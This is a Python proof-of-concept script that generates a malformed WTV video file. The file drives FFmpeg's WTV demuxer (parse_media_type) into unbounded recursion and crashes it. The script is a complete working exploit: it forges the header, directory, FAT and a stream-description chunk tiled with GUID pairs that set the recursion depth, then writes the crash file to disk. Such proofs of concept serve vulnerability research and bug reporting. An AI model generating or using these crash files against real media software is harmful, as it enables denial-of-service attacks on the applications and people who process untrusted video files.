#!/usr/bin/env python3
"""Generate a minimal WTV file that drives wtvdec.c parse_media_type into
unbounded recursion (CWE-674). Structure-only crash PoC, no payload.

Layout (WTV_SECTOR_BITS=12, 4096B sectors, seek_by_sector uses 12 always):
  sector 0: file header (wtv_guid, root_size@0x30, root_sector@0x38)
  sector 1: root directory (single entry: 'timeline' -> FAT'd sectors)
  sector 2: FAT (rl32 sector numbers, nonzero entries only)
  sector 3..: timeline = one SBE2_STREAM_DESC_EVENT chunk whose format
              buffer is tiled with (cpfilters_subtype GUID + cpfilters
              formattype GUID) 32-byte pairs -> recursion depth = size/32.
"""
import struct, sys

WTV_GUID     = bytes([0xB7,0xD8,0x00,0x20,0x37,0x49,0xDA,0x11,0xA6,0x4E,0x00,0x07,0xE9,0x5E,0xAD,0x8D])
DIR_ENTRY    = bytes([0x92,0xB7,0x74,0x91,0x59,0x70,0x70,0x44,0x88,0xDF,0x06,0x3B,0x82,0xCC,0x21,0x3D])
SBE2         = bytes([0xED,0xA4,0x13,0x23,0x2D,0xBF,0x4F,0x45,0xAD,0x8A,0xD9,0x5B,0xA7,0xF9,0x1F,0xEE])
CP_SUB       = bytes([0x28,0xBD,0xAD,0x46,0xD0,0x6F,0x96,0x47,0x93,0xB2,0x15,0x5C,0x51,0xDC,0x04,0x8D])
CP_FMT       = bytes([0x6F,0xB3,0x39,0x67,0x5F,0x1D,0xC2,0x4A,0x81,0x92,0x28,0xBB,0x0E,0x73,0xD1,0x6A])
TIMELINE_U16 = "timeline".encode("utf-16-le") + b"\x00\x00"   # 18 bytes

SEC = 4096
FAT_SECTOR = 2
FIRST_DATA_SECTOR = 3

def build(size: int) -> bytes:
    # timeline payload: SBE2 chunk header then format buffer of `size` bytes
    tl = bytearray()
    tl += SBE2
    tl += struct.pack("<I", 32)      # len (>=32 check)
    tl += struct.pack("<I", 1)       # sid (unknown to ff_find_stream_index)
    tl += b"\x00" * 8                # skipped
    tl += b"\x00" * 28               # skipped
    tl += CP_SUB                     # mediatype (unused in cpfilters branch)
    tl += CP_SUB                     # subtype  -> triggers recursion branch
    tl += b"\x00" * 12               # skipped
    tl += CP_FMT                     # formattype -> triggers recursion branch
    tl += struct.pack("<i", size)    # size
    tl += (CP_SUB + CP_FMT) * (size // 32)
    tl += b"\x00" * 64               # tail padding

    n_data = (len(tl) + SEC - 1) // SEC
    tl = bytes(tl) + b"\x00" * (n_data * SEC - len(tl))
    total_sectors = FIRST_DATA_SECTOR + n_data

    # sector 0: header
    hdr = bytearray(SEC)
    hdr[0:16] = WTV_GUID
    struct.pack_into("<I", hdr, 0x30, 68)                 # root_size
    struct.pack_into("<I", hdr, 0x38, 1)                  # root_sector

    # sector 1: root directory entry for 'timeline'
    root = bytearray(SEC)
    root[0:16] = DIR_ENTRY
    struct.pack_into("<H", root, 16, 68)                  # dir_length
    flen = (1 << 63) | len(tl)                            # bit63 -> 4096B sectors
    struct.pack_into("<Q", root, 24, flen)                # file_length
    struct.pack_into("<I", root, 32, len(TIMELINE_U16)//2)# name_size/2
    root[40:40+len(TIMELINE_U16)] = TIMELINE_U16
    struct.pack_into("<I", root, 40+len(TIMELINE_U16), FAT_SECTOR)  # first_sector
    struct.pack_into("<I", root, 44+len(TIMELINE_U16), 1)           # depth=1 (FAT)

    # sector 2: FAT
    fat = bytearray(SEC)
    for i in range(n_data):
        struct.pack_into("<I", fat, 4*i, FIRST_DATA_SECTOR + i)

    return bytes(hdr) + bytes(root) + bytes(fat) + tl

if __name__ == "__main__":
    size = int(sys.argv[1]) if len(sys.argv) > 1 else 2_000_000
    out  = sys.argv[2] if len(sys.argv) > 2 else "crash_cpfilters.wtv"
    data = build(size)
    open(out, "wb").write(data)
    print(f"{out}: {len(data)} bytes, recursion depth = {size//32}")
